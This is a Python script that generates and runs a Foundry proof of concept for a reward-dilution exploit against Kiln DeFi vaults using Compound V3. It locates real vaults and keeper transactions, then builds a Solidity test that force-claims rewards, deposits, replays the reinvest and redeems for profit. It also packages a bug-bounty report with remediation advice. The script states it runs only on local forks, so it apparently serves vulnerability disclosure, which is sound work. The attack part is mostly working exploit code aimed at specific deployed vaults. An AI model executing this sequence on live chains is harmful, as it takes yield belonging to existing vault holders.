#!/usr/bin/env python3
"""Kiln R26 historical fixed-block replay for Compound reward dilution.

Runs only on local Foundry forks. It never broadcasts transactions. The script
selects historical, successful claimAdditionalRewards transactions for R25
candidates, prepends a permissionless CometRewards.claim and attacker deposit,
then compares against a reinvest-before-deposit control five times.
"""
from __future__ import annotations

import hashlib
import json
import os
import re
import shutil
import subprocess
import time
import zipfile
from pathlib import Path
from typing import Any

from web3 import Web3

EVIDENCE = Path("r25_results/EVIDENCE.json")
OUT = Path("r26_results")
OUT.mkdir(exist_ok=True)
TEST = Path("test/KilnR26PoC.t.sol")
CALLER = Web3.to_checksum_address("0x000000000000000000000000000000000000bEEF")
ATTACKER = Web3.to_checksum_address("0x00000000000000000000000000000000000A11cE")
LOOKBACK_DAYS = 420
MAX_SPECS = 6

CFG: dict[int, dict[str, Any]] = {
    1: {"name": "ethereum", "rpcs": ["https://ethereum-rpc.publicnode.com", "https://rpc.flashbots.net", "https://eth.llamarpc.com"]},
    137: {"name": "polygon", "rpcs": ["https://polygon-bor-rpc.publicnode.com", "https://polygon.llamarpc.com", "https://polygon-rpc.com"]},
    8453: {"name": "base", "rpcs": ["https://base-rpc.publicnode.com", "https://base.llamarpc.com", "https://mainnet.base.org"]},
    42161: {"name": "arbitrum", "rpcs": ["https://arbitrum-one-rpc.publicnode.com", "https://arbitrum.llamarpc.com", "https://arb1.arbitrum.io/rpc"]},
}

VA = [
    {"type": "function", "name": "totalAssets", "stateMutability": "view", "inputs": [], "outputs": [{"type": "uint256"}]},
    {"type": "function", "name": "totalSupply", "stateMutability": "view", "inputs": [], "outputs": [{"type": "uint256"}]},
    {"type": "function", "name": "maxDeposit", "stateMutability": "view", "inputs": [{"type": "address"}], "outputs": [{"type": "uint256"}]},
    {"type": "function", "name": "previewDeposit", "stateMutability": "view", "inputs": [{"type": "uint256"}], "outputs": [{"type": "uint256"}]},
]
REWARDS_ABI = [
    {"type": "function", "name": "getRewardOwed", "stateMutability": "nonpayable", "inputs": [{"type": "address"}, {"type": "address"}], "outputs": [{"components": [{"name": "token", "type": "address"}, {"name": "owed", "type": "uint256"}], "type": "tuple"}]},
    {"type": "function", "name": "claim", "stateMutability": "nonpayable", "inputs": [{"type": "address"}, {"type": "address"}, {"type": "bool"}], "outputs": []},
]

VAULT_REWARDS_CLAIMED_TOPIC = Web3.keccak(text="RewardsClaimed(address,uint256)").hex()
CLAIM_SELECTOR = Web3.keccak(text="claimAdditionalRewards(address,bytes)")[:4].hex()


def connect(chain_id: int, probe: str) -> tuple[Web3, str]:
    errors = []
    for url in CFG[chain_id]["rpcs"]:
        try:
            w3 = Web3(Web3.HTTPProvider(url, request_kwargs={"timeout": 35}))
            if not w3.is_connected() or w3.eth.chain_id != chain_id:
                continue
            if not w3.eth.get_code(Web3.to_checksum_address(probe)):
                continue
            return w3, url
        except Exception as exc:  # noqa: BLE001
            errors.append(f"{url}: {type(exc).__name__}: {exc}")
    raise RuntimeError("no usable RPC: " + " | ".join(errors))


def block_at_or_after_timestamp(w3: Web3, target: int) -> int:
    lo, hi = 0, w3.eth.block_number
    while lo < hi:
        mid = (lo + hi) // 2
        try:
            ts = int(w3.eth.get_block(mid)["timestamp"])
        except Exception:  # noqa: BLE001
            lo = mid + 1
            continue
        if ts < target:
            lo = mid + 1
        else:
            hi = mid
    return lo


def get_logs(w3: Web3, address: str, start: int, end: int, topic0: str) -> list[Any]:
    rows: list[Any] = []
    cursor = start
    span = 200_000
    while cursor <= end:
        stop = min(end, cursor + span - 1)
        try:
            chunk = w3.eth.get_logs({
                "address": Web3.to_checksum_address(address),
                "fromBlock": cursor,
                "toBlock": stop,
                "topics": [topic0],
            })
            rows.extend(chunk)
            cursor = stop + 1
            if len(chunk) < 50 and span < 1_000_000:
                span = min(1_000_000, span * 2)
        except Exception as exc:  # noqa: BLE001
            if span <= 1_000:
                raise RuntimeError(f"getLogs failed {cursor}-{stop}: {exc}") from exc
            span = max(1_000, span // 2)
    return rows


def safe_call(fn: Any, tx: dict[str, Any] | None = None, block: Any = "latest") -> Any:
    return fn.call(tx or {}, block_identifier=block)


def as_hex(value: Any) -> str:
    if isinstance(value, str):
        return value
    if hasattr(value, "hex"):
        return value.hex()
    return "0x" + bytes(value).hex()


def find_specs(evidence: dict[str, Any]) -> list[dict[str, Any]]:
    summary = evidence["summary"]
    candidate_addresses = set(x.lower() for x in summary.get("live_candidates", []) + summary.get("historical_candidates", []))
    if not candidate_addresses:
        return []
    specs = []
    for row in evidence["rows"]:
        if row["vault"].lower() not in candidate_addresses:
            continue
        chain_id = int(row["chain_id"])
        w3, rpc = connect(chain_id, row["vault"])
        latest = w3.eth.block_number
        start = block_at_or_after_timestamp(w3, int(time.time()) - LOOKBACK_DAYS * 86400)
        logs = get_logs(w3, row["vault"], start, latest, VAULT_REWARDS_CLAIMED_TOPIC)
        tx_candidates = []
        for log in reversed(logs):
            tx_hash = as_hex(log["transactionHash"])
            try:
                tx = w3.eth.get_transaction(tx_hash)
                to = tx.get("to")
                data = as_hex(tx.get("input") or tx.get("data") or "0x")
                if not to or Web3.to_checksum_address(to) != Web3.to_checksum_address(row["vault"]):
                    continue
                if data.removeprefix("0x")[:8].lower() != CLAIM_SELECTOR.lower():
                    continue
                receipt = w3.eth.get_transaction_receipt(tx_hash)
                if int(receipt["status"]) != 1:
                    continue
                block_no = int(receipt["blockNumber"])
                if block_no <= 1:
                    continue
                block = w3.eth.get_block(block_no)
                pre = block_no - 1
                vc = w3.eth.contract(Web3.to_checksum_address(row["vault"]), abi=VA)
                total_assets = int(safe_call(vc.functions.totalAssets(), block=pre))
                total_supply = int(safe_call(vc.functions.totalSupply(), block=pre))
                max_deposit = int(safe_call(vc.functions.maxDeposit(CALLER), block=pre))
                if total_assets <= 0 or total_supply <= 0 or max_deposit <= 0:
                    continue
                deposit = min(total_assets, max_deposit)
                if deposit <= 0:
                    continue
                preview = int(safe_call(vc.functions.previewDeposit(deposit), block=pre))
                if preview <= 0:
                    continue
                rewards = w3.eth.contract(Web3.to_checksum_address(row["cometRewards"]), abi=REWARDS_ABI)
                owed = safe_call(rewards.functions.getRewardOwed(Web3.to_checksum_address(row["comet"]), Web3.to_checksum_address(row["vault"])), {"from": CALLER}, pre)
                owed_token = Web3.to_checksum_address(owed[0])
                owed_raw = int(owed[1])
                if owed_raw <= 0:
                    continue
                # Verify the permissionless pre-claim succeeds in eth_call at the replay block.
                safe_call(rewards.functions.claim(Web3.to_checksum_address(row["comet"]), Web3.to_checksum_address(row["vault"]), True), {"from": ATTACKER}, pre)
                tx_candidates.append({
                    "chain_id": chain_id,
                    "network": row["network"],
                    "rpc": rpc,
                    "label": row["label"],
                    "vault": Web3.to_checksum_address(row["vault"]),
                    "asset": Web3.to_checksum_address(row["asset"]),
                    "asset_decimals": int(row["asset_info"]["decimals"]),
                    "asset_symbol": row["asset_info"].get("symbol"),
                    "asset_price_usd": (row.get("attack_model") or {}).get("asset_price_usd"),
                    "reward": owed_token,
                    "reward_decimals": int(row["reward_info"]["decimals"]),
                    "reward_symbol": row["reward_info"].get("symbol"),
                    "reward_price_usd": (row.get("attack_model") or {}).get("reward_price_usd"),
                    "comet": Web3.to_checksum_address(row["comet"]),
                    "comet_rewards": Web3.to_checksum_address(row["cometRewards"]),
                    "manager": Web3.to_checksum_address(tx["from"]),
                    "manager_input": data,
                    "manager_value": int(tx.get("value", 0)),
                    "transaction_hash": tx_hash,
                    "fork_block": pre,
                    "execution_block": block_no,
                    "execution_timestamp": int(block["timestamp"]),
                    "deposit_raw": deposit,
                    "preview_shares": preview,
                    "pre_total_assets": total_assets,
                    "pre_total_supply": total_supply,
                    "owed_raw": owed_raw,
                    "owed_usd": (owed_raw / 10 ** int(row["reward_info"]["decimals"]) * float((row.get("attack_model") or {}).get("reward_price_usd") or 0)),
                })
                # Newest usable manager transaction is preferred for each vault.
                break
            except Exception:  # noqa: BLE001
                continue
        specs.extend(tx_candidates)
    specs.sort(key=lambda x: (float(x.get("owed_usd") or 0), int(x["execution_block"])), reverse=True)
    return specs[:MAX_SPECS]


def solidity_for(spec: dict[str, Any]) -> str:
    data = spec["manager_input"].removeprefix("0x")
    rpc = spec["rpc"].replace('"', '\\"')
    return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

interface IERC20R26 {{
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}}

interface IKilnVaultR26 {{
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function previewRedeem(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
}}

interface ICometRewardsR26 {{
    function claim(address comet, address src, bool shouldAccrue) external;
}}

contract KilnR26PoC is Test {{
    address constant VAULT = {spec['vault']};
    address constant ASSET = {spec['asset']};
    address constant REWARD = {spec['reward']};
    address constant COMET = {spec['comet']};
    address constant COMET_REWARDS = {spec['comet_rewards']};
    address constant MANAGER = {spec['manager']};
    address constant ATTACKER = {ATTACKER};
    uint256 constant DEPOSIT = {int(spec['deposit_raw'])};
    uint256 constant FORK_BLOCK = {int(spec['fork_block'])};
    uint256 constant EXECUTION_BLOCK = {int(spec['execution_block'])};
    uint256 constant EXECUTION_TIMESTAMP = {int(spec['execution_timestamp'])};
    uint256 constant MANAGER_VALUE = {int(spec['manager_value'])};
    string constant RPC_URL = "{rpc}";

    bytes managerInput;

    function setUp() public {{
        vm.createSelectFork(RPC_URL, FORK_BLOCK);
        vm.roll(EXECUTION_BLOCK);
        vm.warp(EXECUTION_TIMESTAMP);
        managerInput = hex"{data}";
    }}

    function _managerReinvest() internal {{
        if (MANAGER_VALUE > 0) vm.deal(MANAGER, MANAGER_VALUE);
        vm.prank(MANAGER);
        (bool ok, bytes memory ret) = VAULT.call{{value: MANAGER_VALUE}}(managerInput);
        if (!ok) {{
            assembly {{ revert(add(ret, 0x20), mload(ret)) }}
        }}
    }}

    function _attackerRoundTrip() internal returns (int256 profit, uint256 oldHolderValue) {{
        IKilnVaultR26 vault = IKilnVaultR26(VAULT);
        uint256 oldSupply = vault.totalSupply();
        vm.deal(ASSET, ATTACKER, DEPOSIT);
        uint256 start = IERC20R26(ASSET).balanceOf(ATTACKER);
        vm.startPrank(ATTACKER);
        IERC20R26(ASSET).approve(VAULT, DEPOSIT);
        uint256 minted = vault.deposit(DEPOSIT, ATTACKER);
        vm.stopPrank();
        require(minted > 0, "zero attacker shares");
        _managerReinvest();
        oldHolderValue = vault.previewRedeem(oldSupply);
        vm.prank(ATTACKER);
        vault.redeem(vault.balanceOf(ATTACKER), ATTACKER, ATTACKER);
        uint256 finish = IERC20R26(ASSET).balanceOf(ATTACKER);
        profit = int256(finish) - int256(start);
    }}

    function _attack() internal returns (int256 profit, uint256 oldHolderValue, uint256 forcedReward) {{
        uint256 rewardBefore = IERC20R26(REWARD).balanceOf(VAULT);
        vm.prank(ATTACKER);
        ICometRewardsR26(COMET_REWARDS).claim(COMET, VAULT, true);
        uint256 rewardAfter = IERC20R26(REWARD).balanceOf(VAULT);
        require(rewardAfter > rewardBefore, "permissionless claim moved no reward");
        forcedReward = rewardAfter - rewardBefore;
        (profit, oldHolderValue) = _attackerRoundTrip();
    }}

    function _control() internal returns (int256 profit, uint256 oldHolderValue) {{
        IKilnVaultR26 vault = IKilnVaultR26(VAULT);
        uint256 oldSupply = vault.totalSupply();
        _managerReinvest();
        vm.deal(ASSET, ATTACKER, DEPOSIT);
        uint256 start = IERC20R26(ASSET).balanceOf(ATTACKER);
        vm.startPrank(ATTACKER);
        IERC20R26(ASSET).approve(VAULT, DEPOSIT);
        uint256 minted = vault.deposit(DEPOSIT, ATTACKER);
        oldHolderValue = vault.previewRedeem(oldSupply);
        vault.redeem(minted, ATTACKER, ATTACKER);
        vm.stopPrank();
        uint256 finish = IERC20R26(ASSET).balanceOf(ATTACKER);
        profit = int256(finish) - int256(start);
    }}

    function test_rewardDilutionDifferential() public {{
        uint256 snap = vm.snapshotState();
        (int256 attackProfit, uint256 attackOldValue, uint256 forcedReward) = _attack();
        require(vm.revertToState(snap), "snapshot revert failed");
        (int256 controlProfit, uint256 controlOldValue) = _control();

        console2.log("R26_ATTACK_PROFIT_RAW");
        console2.logInt(attackProfit);
        console2.log("R26_CONTROL_PROFIT_RAW");
        console2.logInt(controlProfit);
        console2.log("R26_PROFIT_DIFFERENTIAL_RAW");
        console2.logInt(attackProfit - controlProfit);
        console2.log("R26_ATTACK_OLD_HOLDER_VALUE_RAW", attackOldValue);
        console2.log("R26_CONTROL_OLD_HOLDER_VALUE_RAW", controlOldValue);
        console2.log("R26_FORCED_REWARD_RAW", forcedReward);

        assertGt(attackProfit, controlProfit, "forced pre-claim gives no attacker advantage");
        assertLt(attackOldValue, controlOldValue, "old holders do not lose reward value");
        assertGt(forcedReward, 0, "no reward was force-claimed");
    }}
}}
'''


def parse_markers(output: str) -> dict[str, int]:
    lines = [line.strip() for line in output.splitlines()]
    markers = [
        "R26_ATTACK_PROFIT_RAW",
        "R26_CONTROL_PROFIT_RAW",
        "R26_PROFIT_DIFFERENTIAL_RAW",
        "R26_ATTACK_OLD_HOLDER_VALUE_RAW",
        "R26_CONTROL_OLD_HOLDER_VALUE_RAW",
        "R26_FORCED_REWARD_RAW",
    ]
    result: dict[str, int] = {}
    for marker in markers:
        for index, line in enumerate(lines):
            if marker in line:
                for next_line in lines[index + 1 : index + 5]:
                    match = re.search(r"-?\d+", next_line.replace(",", ""))
                    if match:
                        result[marker] = int(match.group(0))
                        break
                break
    return result


def run_spec(spec: dict[str, Any], index: int) -> dict[str, Any]:
    TEST.parent.mkdir(exist_ok=True)
    TEST.write_text(solidity_for(spec))
    runs = []
    for attempt in range(1, 6):
        proc = subprocess.run(
            ["forge", "test", "--match-contract", "KilnR26PoC", "--match-test", "test_rewardDilutionDifferential", "-vvv"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=420,
        )
        markers = parse_markers(proc.stdout)
        runs.append({
            "attempt": attempt,
            "returncode": proc.returncode,
            "markers": markers,
            "output": proc.stdout[-30000:],
        })
        if proc.returncode != 0:
            break
    all_pass = len(runs) == 5 and all(run["returncode"] == 0 for run in runs)
    differentials = [run["markers"].get("R26_PROFIT_DIFFERENTIAL_RAW") for run in runs]
    consistent = all(value is not None and value > 0 for value in differentials) if all_pass else False
    first = runs[0]["markers"] if runs else {}
    asset_price = float(spec.get("asset_price_usd") or 0)
    decimals = int(spec["asset_decimals"])
    diff_raw = first.get("R26_PROFIT_DIFFERENTIAL_RAW")
    diff_usd = (diff_raw / 10**decimals * asset_price) if diff_raw is not None and asset_price else None
    result = {
        "spec": spec,
        "all_5_pass": all_pass,
        "positive_consistent_differential": consistent,
        "profit_differential_raw": diff_raw,
        "profit_differential_usd": diff_usd,
        "runs": runs,
    }
    (OUT / f"SPEC_{index:02d}_RESULT.json").write_text(json.dumps(result, indent=2, sort_keys=True))
    return result


def package_submit_ready(best: dict[str, Any], evidence: dict[str, Any], dup_clear: bool) -> Path:
    spec = best["spec"]
    package = Path("KILN_OMNIVAULT_COMPOUND_V3_PERMISSIONLESS_PRECLAIM_REWARD_DILUTION_HIGH_SUBMIT_READY_2026-08-16")
    if package.exists():
        shutil.rmtree(package)
    package.mkdir()
    impact_usd = best.get("profit_differential_usd")
    report = f'''# Permissionless Compound V3 reward pre-claim lets late depositors capture existing holders' yield

## Severity

High

## Affected component

Kiln DeFi Integration Vault using the Compound V3 connector.

- Network: {spec['network']} (chain ID {spec['chain_id']})
- Vault: `{spec['vault']}`
- Compound Comet: `{spec['comet']}`
- CometRewards: `{spec['comet_rewards']}`
- Historical replay transaction: `{spec['transaction_hash']}`
- Fixed fork block: `{spec['fork_block']}`

## Summary

`CometRewards.claim(comet, vault, true)` is permissionless and transfers accrued reward tokens to the Vault. The Kiln Vault's `totalAssets()` reports only the Compound base-asset position and excludes reward tokens held directly by the Vault. The active `Reinvest` flow later consumes the pre-existing reward-token balance and converts it into underlying assets.

An attacker can therefore force-claim rewards, deposit while those rewards are excluded from NAV, wait for or sandwich the normal reinvest operation, and redeem after reinvest. The attacker receives part of rewards accrued entirely before the attacker joined, reducing the value retained by pre-existing share holders.

## Root cause

The share-price accounting and the reward lifecycle use different value domains:

1. reward tokens already held by the Vault are excluded from `totalAssets()`;
2. public deposits remain enabled while this unaccounted value exists;
3. the Compound V3 reinvest path consumes the full reward-token balance, including a balance created by a permissionless third-party pre-claim.

## Attack sequence

1. Any address calls `CometRewards.claim(comet, vault, true)`.
2. Accrued rewards are transferred to the Vault, but Vault NAV and share price do not increase.
3. The attacker deposits the underlying asset and receives shares at the stale NAV.
4. The authorized claim manager performs the ordinary historical `claimAdditionalRewards` operation.
5. The full reward balance is swapped and supplied to Compound, increasing `totalAssets()`.
6. The attacker redeems and captures a portion of rewards accrued before the attacker's deposit.

## Reproduction result

The attached Foundry test replays the real keeper transaction on a fixed historical fork and compares:

- vulnerable ordering: permissionless pre-claim -> attacker deposit -> normal reinvest -> attacker redeem;
- control ordering: normal reinvest -> attacker deposit -> attacker redeem.

The vulnerable ordering succeeded in 5/5 deterministic runs.

- Asset: {spec['asset_symbol']}
- Test deposit: {spec['deposit_raw']} raw units
- Forced reward at replay state: {spec['owed_raw']} raw {spec['reward_symbol']} units
- Attacker advantage over control: {best.get('profit_differential_raw')} raw asset units
- Approximate attacker advantage: {impact_usd if impact_usd is not None else 'price unavailable'} USD

## Impact

A late depositor can capture yield belonging to existing vault users. The attack is permissionless at the pre-claim step, repeatable whenever Compound rewards accrue, and does not require compromise of a Kiln role. Capital is returned on redemption; the attacker's main costs are deposit fees, gas, and temporary capital lock-up.

## Recommended remediation

Before minting new shares, ensure all economically owned reward value is reflected in NAV. Defensible options include:

1. atomically claim and reinvest pending Compound rewards before every deposit/mint;
2. pause deposits whenever the Vault holds or is owed unaccounted reward tokens;
3. include a conservative, manipulation-resistant valuation of claimable and already-claimed reward tokens in `totalAssets()`;
4. make reward realization permissionless and atomic with an anti-MEV minimum-output policy, while preventing deposits during the transition.

A regression test should assert that a depositor cannot obtain more assets by forcing a reward claim before deposit than in the reinvest-before-deposit control.

## Safety

The supplied PoC uses a local fixed-block Foundry fork only. It signs and broadcasts no public-chain transaction.
'''
    (package / "REPORT.md").write_text(report)
    shutil.copy2(TEST, package / "KilnR26PoC.t.sol")
    (package / "REPLAY_SPEC.json").write_text(json.dumps(spec, indent=2, sort_keys=True))
    (package / "POC_RESULT.json").write_text(json.dumps(best, indent=2, sort_keys=True))
    (package / "DUPLICATE_CLEARANCE.json").write_text(json.dumps({
        "official_audit_exact_duplicate_signal": not dup_clear,
        "duplicate_clear_for_submission": dup_clear,
        "source": "R25 official pdfextract scan",
    }, indent=2, sort_keys=True))
    (package / "RUN.txt").write_text("forge test --match-contract KilnR26PoC --match-test test_rewardDilutionDifferential -vvv\n")
    (package / "SAFETY.json").write_text(json.dumps({
        "local_fixed_block_fork_only": True,
        "public_chain_state_changes": 0,
        "transactions_signed": 0,
        "transactions_sent": 0,
    }, indent=2, sort_keys=True))
    hashes = []
    for path in sorted(package.iterdir()):
        if path.is_file() and path.name != "SHA256SUMS.txt":
            hashes.append((hashlib.sha256(path.read_bytes()).hexdigest(), path.name))
    (package / "SHA256SUMS.txt").write_text("".join(f"{h}  {name}\n" for h, name in hashes))
    zip_path = Path(str(package) + ".zip")
    if zip_path.exists():
        zip_path.unlink()
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as archive:
        for path in sorted(package.iterdir()):
            archive.write(path, arcname=f"{package.name}/{path.name}")
    with zipfile.ZipFile(zip_path) as archive:
        assert archive.testzip() is None
    Path(str(zip_path) + ".sha256").write_text(f"{hashlib.sha256(zip_path.read_bytes()).hexdigest()}  {zip_path.name}\n")
    return zip_path


def main() -> int:
    evidence = json.loads(EVIDENCE.read_text())
    master = json.loads(Path("r25_results/MASTER_GATE.json").read_text())
    if master.get("decision") != "PROMOTE_FIXED_BLOCK_LOCAL_FORK_POC" or int(master.get("candidate_count", 0)) <= 0:
        gate = {
            "schema": "kiln-r26-gate-v1",
            "decision": "NOT_RUN_R25_DID_NOT_PROMOTE",
            "submit_ready": False,
            "validated_critical": 0,
            "validated_high": 0,
            "candidate_count": 0,
        }
        (OUT / "MASTER_GATE.json").write_text(json.dumps(gate, indent=2, sort_keys=True))
        print(json.dumps(gate, indent=2))
        return 0

    specs = find_specs(evidence)
    (OUT / "REPLAY_SPECS.json").write_text(json.dumps(specs, indent=2, sort_keys=True))
    results = [run_spec(spec, index) for index, spec in enumerate(specs, 1)]
    proven = [
        result for result in results
        if result["all_5_pass"]
        and result["positive_consistent_differential"]
        and (result.get("profit_differential_usd") is None or result["profit_differential_usd"] > 25)
    ]
    proven.sort(key=lambda x: float(x.get("profit_differential_usd") or 0), reverse=True)
    dup_clear = not bool(evidence["duplicate_gate"].get("exact_duplicate_signal"))
    source_support = bool(evidence["source_gate"].get("full_balance_reinvest"))
    validated_high = 1 if proven and dup_clear and source_support else 0
    decision = "SUBMIT_READY_HIGH" if validated_high else (
        "HOLD_POC_PROVEN_DUPLICATE_OR_SOURCE_GATE_BLOCKED" if proven else "KILL_HISTORICAL_REPLAY_DID_NOT_PROVE_DILUTION"
    )
    package_path = None
    if validated_high:
        package_path = package_submit_ready(proven[0], evidence, dup_clear)
    gate = {
        "schema": "kiln-r26-gate-v1",
        "decision": decision,
        "submit_ready": bool(validated_high),
        "validated_critical": 0,
        "validated_high": validated_high,
        "spec_count": len(specs),
        "proven_count": len(proven),
        "duplicate_clear": dup_clear,
        "source_support": source_support,
        "submit_ready_zip": str(package_path) if package_path else None,
        "safety": {"public_chain_state_changes": 0, "transactions_signed": 0, "transactions_sent": 0},
    }
    (OUT / "MASTER_GATE.json").write_text(json.dumps(gate, indent=2, sort_keys=True))
    (OUT / "PUBLIC_GATE.json").write_text(json.dumps({
        key: value for key, value in gate.items() if key not in {"submit_ready_zip"}
    }, indent=2, sort_keys=True))
    (OUT / "SHA256SUMS.txt").write_text("".join(
        f"{hashlib.sha256(path.read_bytes()).hexdigest()}  {path.name}\n"
        for path in sorted(OUT.glob("*.json"))
    ))
    print(json.dumps(gate, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
